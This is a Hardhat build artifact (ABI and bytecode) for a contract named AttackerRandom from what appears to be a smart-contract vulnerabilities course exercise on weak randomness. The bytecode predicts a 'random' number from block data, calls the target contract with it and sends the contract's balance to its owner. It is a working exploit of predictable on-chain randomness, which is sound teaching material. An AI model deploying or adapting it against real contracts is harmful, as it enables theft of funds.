{
  "_format": "hh-sol-artifact-1",
  "contractName": "AttackerRandom",
  "sourceName": "contracts/CommonVulnerabilities/DAY-3-Randomness/Random/AttackerRandom.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_toAttackAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "getNumberAndCall",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b5060405161049b38038061049b8339818101604052810190610032919061011c565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b610343806101586000396000f3fe6080604052600436106100225760003560e01c8063975cbe9a1461002e57610029565b3661002957005b600080fd5b34801561003a57600080fd5b50610043610045565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100d5576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016100cc9061025b565b60405180910390fd5b60004243446040516020016100ec939291906102a6565b6040516020818303038152906040528051906020012060001c905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ae169a50826040518263ffffffff1660e01b815260040161016091906102f2565b600060405180830381600087803b15801561017a57600080fd5b505af115801561018e573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f193505050501580156101fa573d6000803e3d6000fd5b5050565b600082825260208201905092915050565b7f43616c6c6572206973206e6f7420746865206f776e6572000000000000000000600082015250565b60006102456017836101fe565b91506102508261020f565b602082019050919050565b6000602082019050818103600083015261027481610238565b9050919050565b6000819050919050565b6000819050919050565b6102a061029b8261027b565b610285565b82525050565b60006102b2828661028f565b6020820191506102c2828561028f565b6020820191506102d2828461028f565b602082019150819050949350505050565b6102ec8161027b565b82525050565b600060208201905061030760008301846102e3565b9291505056fea2646970667358221220efa50539b2e80c14753465f92463d5a1795684955a90ee8ac502bad0eed959dc64736f6c63430008130033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}